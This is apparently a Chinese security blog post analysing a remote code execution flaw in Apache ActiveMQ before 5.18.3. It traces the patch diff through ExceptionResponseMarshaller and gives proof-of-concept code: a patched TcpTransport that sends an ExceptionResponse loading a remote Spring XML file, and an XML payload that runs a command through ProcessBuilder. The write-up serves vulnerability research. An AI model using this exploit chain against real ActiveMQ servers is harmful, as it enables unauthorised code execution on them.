#  Apache ActiveMQ (版本 < 5.18.3) RCE 分析

X1r0z  [ 实战攻防安全 ](javascript:void\(0\);)

**实战攻防安全** ![]()

微信号 gh_b2e3012c2c61

功能介绍 实战攻防安全

____

___发表于_

收录于合集

中午吃饭的时候看到赛博昆仑发了 Apache ActiveMQ 的漏洞通告, 于是去翻了翻 github commit

第⼀眼看感觉跟之前那个 spring-amqp 的漏洞差不多就偷个懒没复现, 后来发现⼤伙都在看这个洞

下午本来想摸⻥的结果被 @Y4er 叫起来让我讲讲这个 rce

![]()

⾃⼰之前没怎么接触过 ActiveMQ, 不过好在最后花了⼀点时间复现了出来, 简单记录⼀下分析的思路

参考:

https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f

https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-
open

wire-
legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java

![]()

根据 diff 可以发现新版本为 BaseDataStreamMarshaller 类加⼊了 validateIsThrowable ⽅法

public static void validateIsThrowable(Class<?> clazz) {

if (!Throwable.class.isAssignableFrom(clazz)) {

throw new IllegalArgumentException("Class " \+ clazz \+ " is not assignable to

Throwable");

}

}

  

然后经过⼀些简单的搜索可以发现 ExceptionResponseMarshaller 这个类, 它是 BaseDataStreamMarshaller 的

⼦类

其 tightUnmarshal/looseUnmarshal ⽅法会调⽤
tightMarshalThrowable/looseMarshalThrowable, 最终调⽤到

BaseDataStreamMarshaller 的 createThrowable ⽅法, 后者可以调⽤任意类的带有⼀个 String 参数的构造⽅法

ExceptionResponseMarshaller 顾名思义就是对 ExceptionResponse 进⾏序列化/反序列化的类

ExceptionResponse 的定义如下

  

package org.apache.activemq.command;

public class ExceptionResponse extends Response {

public static final byte DATA_STRUCTURE_TYPE = 31;

Throwable exception;

public ExceptionResponse() {

}

public ExceptionResponse(Throwable e) {

this.setException(e);

}

public byte getDataStructureType() {

return 31;

}

public Throwable getException() {

return this.exception;

}

public void setException(Throwable exception) {

this.exception = exception;

}

public boolean isException() {

return true;

}

}

  

回到上⾯的 BaseDataStreamMarshaller

![]()

有若⼲ Marshal/unmarshal ⽅法

这⾥以 tightUnmarsalThrowable 为例

![]()

⽅法内部会获取 clazz 和 message, 然后调⽤ createThrowable

找到对应的 tightMarshalThrowable

![]()

o 就是 ExceptionResponse ⾥⾯的 exception 字段 (继承了 Throwable), 然后分别将 o 的 className 和
message

写⼊序列化流

到这⾥思路其实已经差不多了, 我们只需要构造⼀个 ExceptionResponse 然后发给 ActiveMQ 服务器, 之后

ActiveMQ 会⾃⼰调⽤ unmarshal, 最后触发 createThrowable下⾯只需要关注如何发送 ExceptionResponse 即可

参考⽹上的⼊⻔教程写了⼀个 demo

package com.example;

import org.apache.activemq.ActiveMQConnectionFactory;

import javax.jms.*;

public class Demo {

public static void main(String[] args) throws Exception {

ConnectionFactory connectionFactory = new

ActiveMQConnectionFactory("tcp://localhost:61616");

Connection connection = connectionFactory.createConnection();

connection.start();

Session session = connection.createSession();

Destination destination = session.createQueue("tempQueue");

MessageProducer producer = session.createProducer(destination);

Message message = session.createObjectMessage("123");

producer.send(message);

connection.close();

}

}

  

然后随便打⼏个断点试试 (注意在⼀次通信的过程中 ActiveMQ 会 marshal / unmarshal ⼀些其它的数据, 调试的时

候记得判断)

org.apache.activemq.openwire.OpenWireFormat#doUnmarshal()

先获取 dataType, 然后根据它的值去 this.dataMarshallers ⾥⾯获取对应的序列化器

![]()

这个 dataType 其实对应的就是 Message 类内部的 DATA_STRUCTURE_TYPE 字段

在 demo 中我们发送的是⼀个 ObjectMessage (ActiveMQObjectMessage) 对象, 它的 dataType 是 26

![]()

⽽ ExceptionResponse 的 dataType 是 31, 对应上图中的 ExceptionResponseMarshaller

获取到了对应的序列化器之后, 会调⽤它的 tightUnmarshal / looseUnmarshal ⽅法进⼀步处理 Message 内容

![]()

我⼀开始的思路是去修改 ObjectMessage 的 DATA_STRUCTURE_TYPE 字段, 把它改成 31 然后发送

后来想了⼀会发现不能这么搞, 因为对于不同的 Message 类型, 序列化器会单独进⾏处理, ⽐如调⽤ writeXXX 和

readXXX 的类型和次数都不⼀样

因为 ExceptionResponseMarshaller 也有 marshal ⽅法, 所以思路就改成了如何去发送⼀个经由这个 marshaller

处理的 ExceptionResponse

后⾯开始调试 client 发数据的过程

给 OpenWireFormat 的 marshal 系列⽅法打个断点

![]()

调⽤栈往前翻可以找到 TcpTransport 这个类

![]()

它的 oneway ⽅法会调⽤ wireFormat.marshal() 去序列化 command

command 就是前⾯准备发送的 ObjectMessage, ⽽ wireFormat 就是和它对应的序列化器

那么我们只需要⼿动 patch 这个⽅法, 将 command 改成 ExceptionResponse, 将 wireFormat 改成

ExceptionResponseMarshaller 即可这⾥我没有分析 OpenWire 协议, ⽽是⽤了⼀个⽐较取巧的办法

在当前源码⽬录下新建⼀个 org.apache.activemq.transport.tcp.TcpTransport 类, 然后重写对应的逻辑,

这样在运⾏的时候, 因为 classpath 查找顺序的问题, 程序就会优先使⽤当前源码⽬录⾥的 TcpTransport 类

然后是 createThrowable ⽅法的利⽤, 这块其实跟 PostgreSQL JDBC 的利⽤类似, 因为 ActiveMQ ⾃带 spring
相关

依赖, 那么就可以利⽤ ClassPathXmlApplicationContext 加载 XML 实现 RCE

  

public void oneway(Object command) throws IOException {

this.checkStarted();

Throwable obj = new

ClassPathXmlApplicationContext("http://127.0.0.1:8000/poc.xml");

ExceptionResponse response = new ExceptionResponse(obj);

this.wireFormat.marshal(response, this.dataOut);

this.dataOut.flush();

}

  

因为在 marshal 的时候会调⽤ o.getClass().getName() 获取类名, ⽽ getClass ⽅法⽆法重写 (final),
所以我在

这⾥同样 patch 了
org.springframework.context.support.ClassPathXmlApplicationContext , 使其继承

Throwable 类

  

![]()

<?xml version="1.0" encoding="UTF-8" ?>

<beans xmlns="http://www.springframework.org/schema/beans"

xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

xsi:schemaLocation="

http://www.springframework.org/schema/beans

http://www.springframework.org/schema/beans/spring-beans.xsd">

<bean id="pb" class="java.lang.ProcessBuilder" init-
method="start"><constructor-arg >

<list>

<value>open</value>

<value>-a</value>

<value>calculator</value>

</list>

</constructor-arg>

</bean>

</beans>

  

最后成功 RCE

![]()

  

  

  

  

  

  

  

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

